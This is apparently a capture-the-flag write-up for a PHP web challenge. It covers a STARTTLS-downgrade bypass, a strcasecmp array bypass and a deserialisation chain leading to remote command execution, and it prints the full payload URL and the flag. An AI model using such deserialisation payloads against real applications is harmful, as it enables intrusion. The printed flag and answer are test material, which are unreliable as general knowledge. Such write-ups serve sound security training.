# Challenge Name
No shake

### Challenge Description
The admin does not like to shake hands, virus!

### Short Writeup
The initial request requires the Cmd parameter to be added with a buffer value with length 8 to bypass the mitm attack on STARTTLS (STARTTLS downgrade), all characters and numbers are blacklisted, so we replace with unicodes which would give total length as 8.
Cmd=								

The final page requires the key to begin, the first problem is strcasecmp bypass by using arrays, second problem is deserialisation with reference variable, third problem is deserialisation to RCE to retrieve the flag. 
final.php?key=sT4yH0M3&abc[]=sasa&def=O:8:"stdClass":2:{s:4:"flag";N;s:3:"xyz";R:2;}&ghi=O:4:"Dogs":1:{s:3:"obj";O:4:"Cats":1:{s:3:"cmd";s:13:"cat%20final.php";}}


### Challenge Author
m0n574

#### Flag
inctf{Rc3_n_d0wngr4d35_d0n7_g0_W3Ll:}
